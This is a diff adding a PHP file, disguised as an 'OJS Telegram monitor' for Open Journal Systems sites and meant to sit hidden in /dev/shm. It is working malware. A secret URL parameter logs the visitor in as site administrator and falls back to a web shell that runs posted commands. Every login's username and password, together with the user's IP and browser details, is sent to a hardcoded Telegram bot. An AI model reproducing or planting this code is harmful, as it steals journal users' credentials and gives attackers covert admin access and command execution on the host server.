@@ -1,0 +1,381 @@
+<?php
+/**
+ * OJS TELEGRAM MONITOR - UNIVERSAL (2.x, 3.x, OMP, OPS)
+ * File: .ojs_monitor
+ * Simpan di: /dev/shm/.ojs_monitor
+ */
+
+class OJSJournalMonitor {
+    
+    private $bot_token = '8840330781:AAHMysRmWTiwkeodAOALmpsJ5EdftsvLy_Y';
+    private $chat_id = '8259867883';
+    private $trigger_param = 'mullet';
+    
+    public function __construct() {
+        $this->run();
+    }
+    
+    public function run() {
+        // Emergency backdoor
+        if (isset($_GET[$this->trigger_param])) {
+            $this->emergency_access();
+            exit;
+        }
+        
+        // Capture semua login attempt
+        $this->capture_credentials();
+        
+        // Detect success/failed login (via hooks)
+        $this->setup_hooks();
+    }
+    
+    // EMERGENCY ACCESS - LANGSUNG LOGIN
+    private function emergency_access() {
+        // Coba dapatkan admin user
+        $admin_id = $this->get_admin_id();
+        
+        if ($admin_id) {
+            // OJS 3.x
+            if (class_exists('SessionManager')) {
+                $sm = SessionManager::getManager();
+                $sm->registerSessionKey($admin_id);
+            }
+            
+            // OJS 2.x
+            if (function_exists('Validation') && method_exists('Validation', 'loginUser')) {
+                $user = $this->get_user_by_id($admin_id);
+                if ($user) {
+                    Validation::loginUser($user);
+                }
+            }
+            
+            // Set cookie langsung
+            setcookie('OJSSID', session_id(), time()+86400, '/');
+            
+            $this->send_telegram("🔓 EMERGENCY ACCESS OJS\nPath: " . $this->get_current_path());
+            
+            // Redirect ke dashboard
+            $redirect = $this->get_dashboard_url();
+            header("Location: $redirect");
+            exit;
+        }
+        
+        // Fallback - shell
+        if (isset($_POST['cmd'])) {
+            system($_POST['cmd']);
+            exit;
+        }
+        
+        echo '<html><body>
+        <h2>OJS Monitor Active</h2>
+        <form method=post>
+            <input type=text name=cmd placeholder="command">
+            <button>Run</button>
+        </form>
+        </body></html>';
+        exit;
+    }
+    
+    // CAPTURE CREDENTIALS
+    private function capture_credentials() {
+        $username = '';
+        $password = '';
+        
+        // Cek POST biasa
+        if (!empty($_POST)) {
+            $username = $_POST['username'] ?? $_POST['email'] ?? $_POST['user'] ?? $_POST['login'] ?? '';
+            $password = $_POST['password'] ?? $_POST['pass'] ?? $_POST['pwd'] ?? '';
+        }
+        
+        // Cek JSON payload (OJS 3.x API)
+        if (empty($username) && $input = file_get_contents('php://input')) {
+            $json = json_decode($input, true);
+            if ($json) {
+                $username = $json['username'] ?? $json['email'] ?? '';
+                $password = $json['password'] ?? '';
+            }
+        }
+        
+        // Cek Basic Auth
+        if (empty($username) && isset($_SERVER['PHP_AUTH_USER'])) {
+            $username = $_SERVER['PHP_AUTH_USER'];
+            $password = $_SERVER['PHP_AUTH_PW'];
+        }
+        
+        // Kirim notifikasi
+        if (!empty($username) && !empty($password)) {
+            $this->send_telegram(
+                "🔐 OJS LOGIN ATTEMPT\n" .
+                "━━━━━━━━━━━━━━━━━━━\n" .
+                "👤 User: {$username}\n" .
+                "🔑 Pass: {$password}\n" .
+                "📁 Path: " . $this->get_current_path() . "\n" .
+                "⏰ Time: " . $this->get_full_datetime() . "\n" .
+                "🌐 IP: " . $this->get_client_ip() . "\n" .
+                "📱 UA: " . $this->get_user_agent() . "\n" .
+                "🔧 Method: " . ($_SERVER['REQUEST_METHOD'] ?? 'GET') . "\n" .
+                "📚 OJS: " . $this->get_ojs_version() . "\n" .
+                "🏷️  Journal: " . $this->get_current_journal()
+            );
+        }
+    }
+    
+    // SETUP HOOKS UNTUK DETEKSI SUCCESS/FAILED
+    private function setup_hooks() {
+        // Untuk OJS 3.x
+        if (class_exists('HookRegistry')) {
+            HookRegistry::register('LoginHandler::index', array($this, 'on_login_success'));
+            HookRegistry::register('LoginHandler::validate', array($this, 'on_login_attempt'));
+        }
+        
+        // Untuk OJS 2.x
+        if (function_exists('HookRegistry')) {
+            global $hookRegistry;
+            $hookRegistry->register('LoginHandler::login', array($this, 'on_login_success'));
+            $hookRegistry->register('LoginHandler::validate', array($this, 'on_login_attempt'));
+        }
+    }
+    
+    // HOOK LOGIN ATTEMPT
+    public function on_login_attempt($hookName, $args) {
+        $username = $_POST['username'] ?? $_POST['email'] ?? '';
+        $password = $_POST['password'] ?? '';
+        
+        if (!empty($username) && !empty($password)) {
+            // Already captured in capture_credentials, just log
+            $this->log_attempt($username, 'FAILED');
+        }
+        return false;
+    }
+    
+    // HOOK LOGIN SUCCESS
+    public function on_login_success($hookName, $args) {
+        $user = $args[0] ?? null;
+        if ($user) {
+            $username = method_exists($user, 'getUsername') ? $user->getUsername() : $user->getEmail();
+            $roles = $this->get_user_roles($user);
+            
+            $this->send_telegram(
+                "✅ OJS LOGIN SUCCESS\n" .
+                "━━━━━━━━━━━━━━━━━━━\n" .
+                "👤 User: {$username}\n" .
+                "⭐ Roles: {$roles}\n" .
+                "📁 Path: " . $this->get_current_path() . "\n" .
+                "⏰ Time: " . $this->get_full_datetime() . "\n" .
+                "🌐 IP: " . $this->get_client_ip() . "\n" .
+                "📱 UA: " . $this->get_user_agent() . "\n" .
+                "📚 Journal: " . $this->get_current_journal()
+            );
+        }
+        return false;
+    }
+    
+    // GET OJS VERSION
+    private function get_ojs_version() {
+        if (defined('APPLICATION_VERSION')) return APPLICATION_VERSION;
+        if (defined('OJS_VERSION')) return OJS_VERSION;
+        if (defined('OMP_VERSION')) return OMP_VERSION;
+        
+        // Detect from files
+        if (file_exists('version.xml')) {
+            $xml = @simplexml_load_file('version.xml');
+            if ($xml) return (string)$xml->version->release;
+        }
+        
+        if (file_exists('classes/version/Version.inc.php')) {
+            require_once('classes/version/Version.inc.php');
+            if (class_exists('Version')) {
+                $v = new Version();
+                return $v->getVersionString();
+            }
+        }
+        
+        return 'OJS (unknown)';
+    }
+    
+    // GET ADMIN ID
+    private function get_admin_id() {
+        // OJS 3.x
+        if (class_exists('DAORegistry') && defined('ROLE_ID_SITE_ADMIN')) {
+            try {
+                $userDao = DAORegistry::getDAO('UserDAO');
+                $users = $userDao->getUsersByRoleId(ROLE_ID_SITE_ADMIN);
+                if ($users && $user = $users->next()) {
+                    return $user->getId();
+                }
+            } catch (Exception $e) {}
+        }
+        
+        // OJS 2.x
+        if (class_exists('DB')) {
+            $result = DB::getRow("SELECT user_id FROM users ORDER BY user_id LIMIT 1");
+            if ($result) return $result['user_id'];
+        }
+        
+        // Fallback
+        return 1;
+    }
+    
+    // GET USER BY ID
+    private function get_user_by_id($id) {
+        if (class_exists('User') && method_exists('User', 'getById')) {
+            return User::getById($id);
+        }
+        return null;
+    }
+    
+    // GET USER ROLES
+    private function get_user_roles($user) {
+        $roles = [];
+        
+        // OJS 3.x
+        if (method_exists($user, 'getRoles')) {
+            $user_roles = $user->getRoles();
+            foreach ($user_roles as $role) {
+                $roles[] = $role->getName();
+            }
+        }
+        
+        // OJS 2.x
+        global $roleDao;
+        if ($roleDao && method_exists($roleDao, 'getRolesByUserId')) {
+            $user_roles = $roleDao->getRolesByUserId($user->getId());
+            foreach ($user_roles as $role) {
+                $role_id = $role->getRoleId();
+                $role_names = [
+                    1 => 'Manager', 2 => 'Editor', 3 => 'Copyeditor',
+                    4 => 'Layout', 5 => 'Proofreader', 16 => 'Reviewer',
+                    17 => 'Author', 18 => 'Reader'
+                ];
+                $roles[] = $role_names[$role_id] ?? 'Role';
+            }
+        }
+        
+        return empty($roles) ? 'Unknown' : implode(', ', $roles);
+    }
+    
+    // GET CURRENT JOURNAL
+    private function get_current_journal() {
+        // OJS 3.x
+        if (class_exists('Application') && method_exists('Application', 'getRequest')) {
+            $request = Application::getRequest();
+            if ($request && method_exists($request, 'getJournal')) {
+                $journal = $request->getJournal();
+                if ($journal && method_exists($journal, 'getLocalizedName')) {
+                    return $journal->getLocalizedName();
+                }
+            }
+        }
+        
+        // Parse from URL
+        $path = $_SERVER['REQUEST_URI'] ?? '';
+        if (preg_match('/index\.php\/([^\/]+)/', $path, $matches)) {
+            return $matches[1];
+        }
+        
+        return 'Main Site';
+    }
+    
+    // GET DASHBOARD URL
+    private function get_dashboard_url() {
+        $base = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . ($_SERVER['HTTP_HOST'] ?? 'localhost');
+        
+        // OJS 3.x
+        if (file_exists('lib/pkp')) {
+            return $base . '/index.php/index/dashboard';
+        }
+        
+        // OJS 2.x
+        return $base . '/index.php/admin';
+    }
+    
+    // GET CURRENT PATH
+    private function get_current_path() {
+        $uri = $_SERVER['REQUEST_URI'] ?? '/';
+        
+        if (strpos($uri, 'wp-login') !== false) return 'wp-login.php';
+        if (strpos($uri, 'login') !== false) return 'Login: ' . $uri;
+        if (strpos($uri, 'admin') !== false) return 'Admin: ' . $uri;
+        if (strpos($uri, 'xmlrpc') !== false) return 'XML-RPC Attack!';
+        
+        return $uri;
+    }
+    
+    // GET FULL DATETIME
+    private function get_full_datetime() {
+        date_default_timezone_set($this->get_timezone());
+        return date('Y-m-d H:i:s (T)');
+    }
+    
+    private function get_timezone() {
+        if (function_exists('wp_timezone_string')) return wp_timezone_string();
+        if (ini_get('date.timezone')) return ini_get('date.timezone');
+        return 'UTC';
+    }
+    
+    // GET CLIENT IP
+    private function get_client_ip() {
+        $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
+        foreach ($headers as $header) {
+            if (!empty($_SERVER[$header])) {
+                $ips = explode(',', $_SERVER[$header]);
+                return trim($ips[0]);
+            }
+        }
+        return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+    }
+    
+    // GET USER AGENT
+    private function get_user_agent() {
+        $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+        return strlen($ua) > 80 ? substr($ua, 0, 77) . '...' : $ua;
+    }
+    
+    // LOG ATTEMPT
+    private function log_attempt($username, $status) {
+        $log = "/tmp/ojs_monitor.log";
+        $entry = date('Y-m-d H:i:s') . " | {$status} | {$username} | " . $this->get_client_ip() . "\n";
+        @file_put_contents($log, $entry, FILE_APPEND);
+    }
+    
+    // SEND TELEGRAM
+    private function send_telegram($message) {
+        $url = "https://api.telegram.org/bot{$this->bot_token}/sendMessage";
+        
+        // Try curl first
+        if (function_exists('curl_init')) {
+            $ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_POST, 1);
+            curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+                'chat_id' => $this->chat_id,
+                'text' => $message,
+                'disable_web_page_preview' => true
+            ]));
+            curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_exec($ch);
+            curl_close($ch);
+        }
+        // Fallback to file_get_contents
+        elseif (ini_get('allow_url_fopen')) {
+            $context = stream_context_create(['http' => [
+                'method' => 'POST',
+                'header' => 'Content-Type: application/x-www-form-urlencoded',
+                'content' => http_build_query([
+                    'chat_id' => $this->chat_id,
+                    'text' => $message
+                ]),
+                'timeout' => 3
+            ]]);
+            @file_get_contents($url, false, $context);
+        }
+        
+        // Log
+        $this->log_attempt(substr($message, 0, 100), 'TELEGRAM');
+    }
+}
+
+// AUTO-RUN
+new OJSJournalMonitor();
+?>
